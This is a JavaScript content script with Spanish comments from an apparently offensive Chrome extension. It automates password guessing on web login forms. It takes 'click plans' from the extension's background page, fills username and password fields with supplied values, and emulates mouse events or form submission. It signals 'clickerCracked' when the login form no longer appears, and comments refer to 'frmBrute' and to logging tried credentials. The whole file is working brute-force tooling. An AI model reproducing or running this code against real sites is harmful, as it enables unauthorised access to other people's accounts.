/*
	content script  clicker
	event emulator.
	sha0()badcehcksum.net

	Hay dos tipos de formulario, los que provocan un refresh 
	de toda la página (submit tradicional), y los asincronos que no refrescan la página.
	Esto es importante porque en el refresh, el contexto del clicker 
	se pierde en cada petición. Hay varias formas de hacer consciente al clicker de
	que está perdiendo el estado, una de las mejores formas de hacerlo, es que el click
	plan envíe un id de intento de login, y que clicker siga tambien un contador. 
	Si el contador de clicker está a 0 y el del clickplan >0 entonces se da cuenta de
	que la página está haciendo refresh.


	TODO: utilizar getElementByName() si falla el getElementById() o bien guardar en la estructura si es name o id

*/

(function() {

	clicker = {
		loaded: false,
		enabled: false,
		refresh: false
	};

	clicker.lock = function() {
		clicker.lck = true;
	};

	clicker.unlock = function() {
		clicker.lck = false;
	};

	clicker.enable = function() {
		console.log('ready sent');
		clicker.sendReady();

		clicker.enabled = true;
		console.log('clicker enabled');
	};

	// recepción

	clicker.comm = function(msg) {
		switch (msg.method) {

			case 'autoclick':
				clicker.emulate(msg);
				break;

		}

		return true;
	};

	// envío de mensajes a background

	clicker._send = function(meth) {
		chrome.extension.sendMessage({
			method: meth,
			fp: clicker.getFingerprint()
		}, clicker.comm);
	};

	clicker.sendReady = function() {
		console.log('sending ready');
		clicker._send('clickerReady');
		console.log('ready sent');
	};

	clicker.sendCracked = function() {
		clicker._send('clickerCracked');		
	};

	clicker.log = function(msg) {
		chrome.extension.sendMessage({
			method: 'log',
			log:msg
		}, clicker.comm);
	};


	// testing

	clicker.test = function(cp) {
		console.log('test case');

		for (var i=0; i<cp.targets.length; i++)
			console.log(cp.targets[i].id+' -> '+cp.targets[i].value);
		console.log('vector: '+cp.vector);
	};

	// generar fingerprint

	clicker.getFingerprint = function() {
		var html = document.documentElement.innerHTML;
		return {
			url: document.location.href,
			lines: html.split('\n').length,
			words: html.split(' ').length
		};
	};


	clicker.getElm = function(id) {
		var obj = document.getElementById(id);
		if (obj)
			return obj;

		obj = document.getElementsByName(id);
		if (obj.length >0)
			return obj[0];

		return null;
	}

	clicker.garbage = function(obj) {
		setTimeout(function() {
			delete obj;
		},0);
	}


	clicker.emulate = function(cp) {
		var frm;
		var btn = clicker.getElm(cp.vector);
		var t0 = clicker.getElm(cp.targets[0].id);
		if (t0)
			frm = t0.form;
		else {
			console.log('target 0 id doesnt exists');
			return; 
		}
		clicker.garbage(t0);


		//var frm = document.getElementById(cp.form);

		if (!btn && !frm) { //TODO: si cambia la url es que también hemos entrado
			clicker.sendCracked(cp); //clicker.log ??
			return;
		}

		//TODO: lanzar eventos de los input text
		for (var i=0; i<cp.targets.length; i++) {
			var obj = clicker.getElm(cp.targets[i].id);
			obj.value = cp.targets[i].value;
			console.log(cp.targets[i].id+': '+cp.targets[i].value);
			clicker.garbage(obj);
		}

		//clicker.log('user: '+cp.targets[0].value+' pwd: '+cp.targets[1].value+' clicker: '+clicker.id+' frmBrute:'+cp.id);
		//console.log('clicker: '+clicker.id+' frmBrute:'+cp.id);

		clicker.realClick(btn,frm);

		if (!clicker.refresh)   // la página no hace refresh.
			clicker.sendReady(cp);
		
		/*
		Esto crea duplicidad de ejecuciones en formBrute

		setTimeout(function(){
			clicker.lock();
			clicker.sendReady(cp);
			clicker.unlock();
		},100);
		*/
	};

	clicker._ev = function(evname, target) {
	    var evt = target.ownerDocument.createEvent('MouseEvents');
	    evt.initMouseEvent(evname,true,true,target.ownerDocument.defaultView,0,0,0,0,0,false,false,false,false,0,null);
	    var canceled = !target.dispatchEvent(evt);
	    return canceled;
	};

	clicker.realClick = function(btn,frm) {
		var fired = false;



		if (btn) {
			if (btn.onmouseover) {
				//console.log('firing mouseover');
				clicker._ev('mouseover', btn);
				fired = true;
			}

			if (btn.onmousedown) {
				//console.log('firing mousedown');
				clicker._ev('mousedown', btn);
				fired = true;
			}

			if (btn.onmouseup) {
				//console.log('firing mouseup');
				clicker._ev('mouseup', btn);
				fired = true;
			}

			if (btn.onclick) {
				//console.log('firing onclick');
				btn.click();
				fired = true;
			}

			if (btn.onsubmit) {
				//console.log('firing buton onsubmit');
				btn.submit();
				fired = true;
			}
		}
		
		if (!btn || btn.type == 'submit' || !fired) {
			console.log('firing form submit');
			clicker.enabled = false; // no es necesario
			clicker.refresh = true;
			frm.submit();
			console.log('submit fired');
		}
			
	};


    clicker.loaded = true;
    clicker.enable();

})();